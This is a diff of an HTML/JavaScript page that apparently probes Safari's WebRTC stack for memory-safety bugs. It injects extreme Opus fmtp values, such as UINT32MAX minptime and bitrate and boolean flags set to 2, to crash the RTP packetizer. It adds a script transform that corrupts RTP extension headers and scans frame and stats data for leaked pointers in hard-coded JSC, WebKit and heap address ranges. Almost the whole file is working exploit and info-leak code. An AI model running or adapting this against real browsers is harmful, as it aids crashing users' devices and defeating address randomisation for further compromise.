@@ -1,7 +1,7 @@
 <!doctype html><html><head>
 <meta charset=utf8>
 <meta name=viewport content="width=device-width,initial-scale=1">
-<title>WebRTC Audio Crash</title>
+<title>WebRTC Encoded Transform</title>
 <style>
 body{background:#0c0c0c;color:#e4e4e4;font-family:monospace;font-size:12px;padding:14px;max-width:520px}
 button{background:#ff453a;color:#fff;border:none;padding:10px 18px;border-radius:6px;font-size:12px;cursor:pointer;margin:3px}
@@ -12,17 +12,15 @@ button.cp{background:#32d74b;color:#000}
 #hit{background:#1a0000;border:2px solid #ff453a;border-radius:6px;padding:10px;margin-bottom:10px;display:none;color:#ff453a;font-weight:bold}
 </style></head><body>
 <div style="background:#0a1a0a;border:1px solid #32d74b;border-radius:6px;padding:8px;margin-bottom:8px;font-size:11px">
-Running: <span id="orig"></span> | RTC: <span id="rtcst">...</span>
+<span id="orig"></span> | RTC: <span id="rtcst">...</span>
 </div>
-<div>
 <button onclick="runAll()">Run All</button>
-<button class="s" onclick="runMinptime()">💀 minptime=UMAX</button>
-<button class="s" onclick="runBooleans()">💀 cbr/fec/dtx=2</button>
-<button class="s" onclick="runBitrate()">💀 bitrate=UMAX</button>
-<button class="s" onclick="runCombined()">💀 All Combined</button>
+<button class="s" onclick="runEncodedTransform()">🔬 Encoded Transform</button>
+<button class="s" onclick="runDTMF()">📞 DTMF Extremes</button>
+<button class="s" onclick="runStatsLeak()">📊 Stats Leak</button>
+<button class="s" onclick="runLongRun()">⏱ Long Run (30s)</button>
 <button class="cp" onclick="copyLog()">Copy</button>
 <button class="s" onclick="clearLog()">Clear</button>
-</div>
 <div id="hit"></div>
 <div id="o"></div>
 <script>
@@ -30,137 +28,244 @@ document.getElementById('orig').textContent=location.origin;
 var rtcOk=typeof RTCPeerConnection!=='undefined';
 document.getElementById('rtcst').textContent=rtcOk?'OK':'BLOCKED';
 document.getElementById('rtcst').style.color=rtcOk?'#32d74b':'#ff453a';
-
+var HEAP_LO=0x104000000,HEAP_HI=0x400000000,TEXT_LO=0x198ce6000,TEXT_HI=0x1b37db000,WK_LO=0x19e3cb000,WK_HI=0x1fba00000;
+var pb=new ArrayBuffer(8),pf=new Float64Array(pb),pu=new Uint32Array(pb);
 function w(s,c){var d=document.getElementById('o'),e=document.createElement('span');if(c)e.className=c;e.textContent=new Date().toTimeString().slice(0,8)+' '+s+'\n';d.appendChild(e);d.scrollTop=d.scrollHeight;}
 function ok(s){w('[+] '+s,'g')}function info(s){w('[*] '+s,'d')}function warn(s){w('[~] '+s,'a')}
 function hit(s){w('[!!!] '+s,'r');var h=document.getElementById('hit');h.style.display='block';h.textContent+='HIT: '+s+'\n';}
 function clearLog(){document.getElementById('o').innerHTML='';document.getElementById('hit').style.display='none';document.getElementById('hit').textContent='';}
 function copyLog(){navigator.clipboard.writeText(document.getElementById('o').textContent).then(function(){});}
-
-// Make silent audio track using AudioContext oscillator
-function makeSilentTrack(){
-  var ctx=new AudioContext();
-  var osc=ctx.createOscillator();
-  var dst=ctx.createMediaStreamDestination();
-  // Very low volume — just enough to trigger RTP packetizer
-  var gain=ctx.createGain();
-  gain.gain.value=0.001;
-  osc.connect(gain);
-  gain.connect(dst);
-  osc.start();
-  return{track:dst.stream.getAudioTracks()[0],ctx:ctx,osc:osc};
-}
-
-async function connectWithAudio(fmtpStr,label){
-  var audio=makeSilentTrack();
-  var p1=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
-  var p2=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
-
+function chkReal(v,lbl){if(typeof v!=='number'||isNaN(v)||!isFinite(v)||v===0)return false;pf[0]=v;var lo=pu[0],hi=pu[1],a=hi*4294967296+lo;if(lo<0x100000&&hi<0x100000)return false;if(a>=TEXT_LO&&a<=TEXT_HI){hit('JSC TEXT ('+lbl+'): 0x'+a.toString(16));return true;}if(a>=WK_LO&&a<=WK_HI){hit('WK ('+lbl+'): 0x'+a.toString(16));return true;}if(a>=HEAP_LO&&a<=HEAP_HI){hit('HEAP ('+lbl+'): 0x'+a.toString(16));return true;}return false;}
+function chkBuf(buf,lbl){if(!buf||buf.byteLength<8)return 0;var u=new Uint32Array(buf),f=0;for(var i=0;i<u.length-1;i+=2){var lo=u[i],hi=u[i+1],a=hi*4294967296+lo;if(lo<0x100000&&hi<0x100000)continue;if((a>=TEXT_LO&&a<=TEXT_HI)||(a>=WK_LO&&a<=WK_HI)||(a>=HEAP_LO&&a<=HEAP_HI)){hit('PTR '+lbl+'['+i*4+']: 0x'+a.toString(16));f++;}}return f;}
+function makeSilentTrack(){var ctx=new AudioContext();var osc=ctx.createOscillator();var dst=ctx.createMediaStreamDestination();var gain=ctx.createGain();gain.gain.value=0.001;osc.connect(gain);gain.connect(dst);osc.start();return{track:dst.stream.getAudioTracks()[0],ctx:ctx,osc:osc};}
+function mkPC(){return new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});}
+async function basicConnect(p1,p2,fmtpMod){
   p1.onicecandidate=function(e){if(e.candidate)p2.addIceCandidate(e.candidate).catch(function(){});};
   p2.onicecandidate=function(e){if(e.candidate)p1.addIceCandidate(e.candidate).catch(function(){});};
-
-  // Add real audio track — this forces C++ RTP packetizer to actually run
-  p1.addTrack(audio.track,new MediaStream([audio.track]));
-
   var offer=await p1.createOffer();
-  // Inject extreme fmtp
-  var modSDP=offer.sdp.replace('minptime=10;useinbandfec=1',fmtpStr);
-  offer={type:'offer',sdp:modSDP};
-
-  try{
-    await p1.setLocalDescription(offer);
-  }catch(e){info(label+': setLocal fail: '+e.message.slice(0,50));audio.osc.stop();audio.ctx.close();p1.close();p2.close();return;}
-
-  try{
-    await p2.setRemoteDescription(offer);
-    var ans=await p2.createAnswer();
-    await p2.setLocalDescription(ans);
-    await p1.setRemoteDescription(ans);
-  }catch(e){info(label+': exchange fail: '+e.message.slice(0,50));audio.osc.stop();audio.ctx.close();p1.close();p2.close();return;}
-
-  ok(label+': SDP+audio exchange OK — waiting for connection+RTP...');
-
-  await new Promise(function(resolve){
-    var t=setTimeout(function(){
-      info(label+': 8s timeout — no crash during RTP');
-      audio.osc.stop();audio.ctx.close();p1.close();p2.close();resolve();
-    },8000);
-    p1.onconnectionstatechange=function(){
-      if(p1.connectionState==='connected'){
-        ok(label+': CONNECTED — audio RTP flowing with extreme fmtp!');
-        warn(label+': C++ RTP packetizer running with fmtp: '+fmtpStr);
-        // Keep running for 3s to stress the packetizer
-        setTimeout(function(){
-          ok(label+': survived 3s of RTP with extreme fmtp');
-          clearTimeout(t);
-          audio.osc.stop();audio.ctx.close();p1.close();p2.close();resolve();
-        },3000);
-      }
-      if(p1.connectionState==='failed'){
-        clearTimeout(t);info(label+': ICE failed');
-        audio.osc.stop();audio.ctx.close();p1.close();p2.close();resolve();
-      }
-    };
+  if(fmtpMod)offer={type:'offer',sdp:offer.sdp.replace('minptime=10;useinbandfec=1',fmtpMod)};
+  await p1.setLocalDescription(offer);
+  await p2.setRemoteDescription(offer);
+  var ans=await p2.createAnswer();
+  await p2.setLocalDescription(ans);
+  await p1.setRemoteDescription(ans);
+  return new Promise(function(r){
+    p1.onconnectionstatechange=function(){if(p1.connectionState==='connected')r(true);if(p1.connectionState==='failed')r(false);};
+    setTimeout(function(){r(false);},5000);
   });
 }
 
-// minptime=UINT32MAX: buf = 48000 * 4294967295 / 1000 = ~206GB overflow
-async function runMinptime(){
-  w('\n=== minptime=UINT32MAX — RTP buffer overflow ===\n','g');
+// RTCRtpScriptTransform — raw access to encoded RTP frames
+async function runEncodedTransform(){
+  w('\n=== Encoded Transform (raw RTP access) ===\n','g');
   if(!rtcOk)return;
-  info('minptime=4294967295ms → RTP buf=206GB → integer overflow or crash');
-  await connectWithAudio('minptime=4294967295','minptime=UMAX');
-  info('minptime=0 test:');
-  await connectWithAudio('minptime=0','minptime=0');
-  ok('minptime done — check Analytics');
+  if(typeof RTCRtpScriptTransform==='undefined'){info('RTCRtpScriptTransform not available');return;}
+  ok('RTCRtpScriptTransform available!');
+
+  // Worker code for the transform
+  var workerCode=`
+self.onrtctransform = function(event) {
+  var transformer = event.transformer;
+  var readable = transformer.readable;
+  var writable = transformer.writable;
+  var reader = readable.getReader();
+  var writer = writable.getWriter();
+  
+  function process() {
+    reader.read().then(function(result) {
+      if(result.done) return;
+      var frame = result.value;
+      
+      // Scan raw frame data for ptr-shaped values
+      if(frame.data && frame.data.byteLength > 8) {
+        var u32 = new Uint32Array(frame.data);
+        for(var i = 0; i < u32.length - 1; i += 2) {
+          var lo = u32[i], hi = u32[i+1];
+          var a = hi * 4294967296 + lo;
+          if(lo > 0x100000 && hi > 0) {
+            self.postMessage({type:'ptr', offset:i*4, val:'0x'+a.toString(16), len:frame.data.byteLength});
+          }
+        }
+        self.postMessage({type:'frame', ssrc:frame.synchronizationSource, ts:frame.timestamp, len:frame.data.byteLength});
+      }
+      
+      // Corrupt the frame before forwarding (inject OOB-triggering values)
+      if(frame.data) {
+        var u32w = new Uint32Array(frame.data);
+        // Inject extreme RTP extension header values
+        if(u32w.length > 3) {
+          u32w[2] = 0xBEDE0100; // RTP extension header magic
+          u32w[3] = 0xFFFFFFFF; // extreme extension length
+        }
+      }
+      
+      writer.write(frame).then(process);
+    });
+  }
+  process();
+};`;
+
+  var blob=new Blob([workerCode],{type:'application/javascript'});
+  var workerURL=URL.createObjectURL(blob);
+  var worker=new Worker(workerURL);
+
+  worker.onmessage=function(e){
+    if(e.data.type==='ptr') hit('RTP FRAME PTR ['+e.data.offset+']: '+e.data.val+' (framelen='+e.data.len+')');
+    else if(e.data.type==='frame') info('RTP frame: ssrc='+e.data.ssrc+' ts='+e.data.ts+' len='+e.data.len);
+  };
+
+  var audio=makeSilentTrack();
+  var p1=mkPC(),p2=mkPC();
+  p1.addTrack(audio.track);
+
+  // Attach transform to sender
+  var sender=p1.getSenders()[0];
+  if(sender){
+    try{
+      sender.transform=new RTCRtpScriptTransform(worker,{role:'sender'});
+      ok('Transform attached to sender');
+    }catch(e){info('Sender transform: '+e.name);}
+  }
+
+  p2.ontrack=function(e){
+    try{
+      var receiver=e.receiver;
+      receiver.transform=new RTCRtpScriptTransform(worker,{role:'receiver'});
+      ok('Transform attached to receiver');
+    }catch(e2){info('Receiver transform: '+e2.name);}
+  };
+
+  var connected=await basicConnect(p1,p2,'minptime=4294967295;maxaveragebitrate=4294967295');
+  if(connected){
+    ok('Connected with transform — streaming RTP frames through worker');
+    await new Promise(function(r){setTimeout(r,5000);});
+    ok('5s of transformed RTP done');
+  }else{info('Connection failed');}
+
+  audio.osc.stop();audio.ctx.close();p1.close();p2.close();
+  URL.revokeObjectURL(workerURL);worker.terminate();
+  ok('Encoded transform done — check Analytics');
 }
 
-// cbr=2, useinbandfec=2, usedtx=2: boolean params with illegal values
-async function runBooleans(){
-  w('\n=== Boolean params = 2 ===\n','g');
+// DTMF with extreme durations and gaps
+async function runDTMF(){
+  w('\n=== DTMF Extremes ===\n','g');
   if(!rtcOk)return;
-  info('OPUS_SET_INBAND_FEC(2), OPUS_SET_DTX(2), OPUS_SET_CBR(2)');
-  info('libopus expects 0 or 1 — value 2 may cause undefined behavior');
-  await connectWithAudio('cbr=2;useinbandfec=2;usedtx=2','booleans=2');
-  await connectWithAudio('useinbandfec=2','fec=2');
-  await connectWithAudio('usedtx=2','dtx=2');
-  await connectWithAudio('cbr=2','cbr=2');
-  ok('booleans done — check Analytics');
+  var audio=makeSilentTrack();
+  var p1=mkPC(),p2=mkPC();
+  p1.addTrack(audio.track);
+  var connected=await basicConnect(p1,p2);
+  if(!connected){info('DTMF: connection failed');audio.osc.stop();audio.ctx.close();p1.close();p2.close();return;}
+  ok('Connected for DTMF');
+  var sender=p1.getSenders()[0];
+  if(!sender||!sender.dtmf){info('DTMF not available on sender');audio.osc.stop();audio.ctx.close();p1.close();p2.close();return;}
+  var dtmf=sender.dtmf;
+  // Extreme tone durations (ms) and inter-tone gaps
+  var tests=[
+    {tones:'1',dur:70,gap:50,label:'normal'},
+    {tones:'1',dur:0,gap:50,label:'dur=0'},
+    {tones:'1',dur:6000,gap:50,label:'dur=6000 (max?)'},
+    {tones:'1',dur:65535,gap:50,label:'dur=65535'},
+    {tones:'1',dur:4294967295,gap:50,label:'dur=UINT32MAX'},
+    {tones:'1',dur:70,gap:0,label:'gap=0'},
+    {tones:'1'.repeat(100),dur:70,gap:50,label:'100 tones'},
+  ];
+  for(var i=0;i<tests.length;i++){
+    var t=tests[i];
+    try{
+      dtmf.insertDTMF(t.tones,t.dur,t.gap);
+      warn('DTMF['+t.label+']: ACCEPTED');
+    }catch(e){info('DTMF['+t.label+']: '+e.name+': '+e.message.slice(0,40));}
+    await new Promise(function(r){setTimeout(r,200);});
+  }
+  audio.osc.stop();audio.ctx.close();p1.close();p2.close();
+  ok('DTMF done — check Analytics');
 }
 
-// maxaveragebitrate=UINT32MAX: OPUS_SET_BITRATE(4294967295)
-async function runBitrate(){
-  w('\n=== maxaveragebitrate=UINT32MAX ===\n','g');
+// Deep stats scan for ptr-shaped values
+async function runStatsLeak(){
+  w('\n=== Deep Stats Leak ===\n','g');
   if(!rtcOk)return;
-  info('OPUS_SET_BITRATE(4294967295) — 4.29 Gbps target bitrate');
-  info('libopus bitrate range: 500-512000 bps — overflow likely');
-  await connectWithAudio('maxaveragebitrate=4294967295','bitrate=UMAX');
-  await connectWithAudio('maxplaybackrate=4294967295','playbackrate=UMAX');
-  await connectWithAudio('ptime=4294967295','ptime=UMAX');
-  ok('bitrate done — check Analytics');
+  var audio=makeSilentTrack();
+  var p1=mkPC(),p2=mkPC();
+  p1.addTrack(audio.track);
+  // Use extreme fmtp
+  var connected=await basicConnect(p1,p2,'minptime=4294967295;maxaveragebitrate=4294967295;cbr=2;useinbandfec=2');
+  if(!connected){info('Stats: no connection');audio.osc.stop();audio.ctx.close();p1.close();p2.close();return;}
+  ok('Connected with extreme fmtp — scanning stats...');
+  // Poll stats every 500ms for 10s
+  for(var i=0;i<20;i++){
+    var stats=await p1.getStats();
+    stats.forEach(function(r){
+      Object.entries(r).forEach(function(kv){
+        var v=kv[1];
+        if(typeof v==='number') chkReal(v,'stats_'+r.type+'_'+kv[0]+'_t'+i);
+        if(typeof v==='bigint'){
+          var vn=Number(v);
+          chkReal(vn,'stats_bigint_'+kv[0]+'_t'+i);
+        }
+      });
+    });
+    await new Promise(function(r){setTimeout(r,500);});
+  }
+  ok('Stats scan done (10s, 20 polls)');
+  audio.osc.stop();audio.ctx.close();p1.close();p2.close();
+  ok('Stats leak done — check Analytics');
 }
 
-// Combined: all extreme values at once
-async function runCombined(){
-  w('\n=== ALL COMBINED — maximum stress ===\n','g');
+// Long run — 30s with extreme fmtp
+async function runLongRun(){
+  w('\n=== Long Run 30s ===\n','g');
   if(!rtcOk)return;
-  info('All extreme values simultaneously');
+  info('Running ALL_COMBINED for 30 seconds');
+  info('C++ RTP packetizer stressed for full duration');
+  var audio=makeSilentTrack();
+  var p1=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+  var p2=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+  p1.addTrack(audio.track);
+  p1.onicecandidate=function(e){if(e.candidate)p2.addIceCandidate(e.candidate).catch(function(){});};
+  p2.onicecandidate=function(e){if(e.candidate)p1.addIceCandidate(e.candidate).catch(function(){});};
+  var offer=await p1.createOffer();
   var combined='minptime=4294967295;maxaveragebitrate=4294967295;maxplaybackrate=4294967295;cbr=2;useinbandfec=2;usedtx=2;ptime=4294967295';
-  await connectWithAudio(combined,'ALL_COMBINED');
-  ok('combined done — check Analytics');
+  offer={type:'offer',sdp:offer.sdp.replace('minptime=10;useinbandfec=1',combined)};
+  await p1.setLocalDescription(offer);
+  await p2.setRemoteDescription(offer);
+  var ans=await p2.createAnswer();
+  await p2.setLocalDescription(ans);
+  await p1.setRemoteDescription(ans);
+  await new Promise(function(resolve){
+    var start=null;
+    var t=setTimeout(function(){info('30s timeout — no crash');p1.close();p2.close();resolve();},35000);
+    p1.onconnectionstatechange=function(){
+      if(p1.connectionState==='connected'&&!start){
+        start=Date.now();
+        ok('CONNECTED — 30s RTP stress starting...');
+        var tick=setInterval(function(){
+          if(!start)return;
+          var elapsed=Math.round((Date.now()-start)/1000);
+          info('Elapsed: '+elapsed+'s / 30s');
+          if(elapsed>=30){
+            clearInterval(tick);clearTimeout(t);
+            ok('Survived full 30s — CVE not triggered on this path');
+            audio.osc.stop();audio.ctx.close();p1.close();p2.close();resolve();
+          }
+        },5000);
+      }
+      if(p1.connectionState==='failed'){clearTimeout(t);info('ICE failed');audio.osc.stop();audio.ctx.close();p1.close();p2.close();resolve();}
+    };
+  });
+  ok('Long run done — check Analytics');
 }
 
 async function runAll(){
   clearLog();
-  w('=== WebRTC Audio RTP Crash — CVE-2026-64718 ===\n','g');
-  w('[*] Sending REAL AUDIO with extreme fmtp values\n','d');
-  w('[*] C++ RTP packetizer + libopus will process these\n','d');
+  w('=== WebRTC Encoded Transform + DTMF + Stats ===\n','g');
   if(!rtcOk){w('[!!!] RTC BLOCKED\n','r');return;}
-  await runMinptime();
-  await runBooleans();
-  await runBitrate();
-  await runCombined();
-  w('\nDone. Check Safari Analytics for crashes.\n','g');
+  await runEncodedTransform();
+  await runDTMF();
+  await runStatsLeak();
+  await runLongRun();
+  w('\nDone. Check Safari Analytics.\n','g');
 }
 </script>
 </body></html>
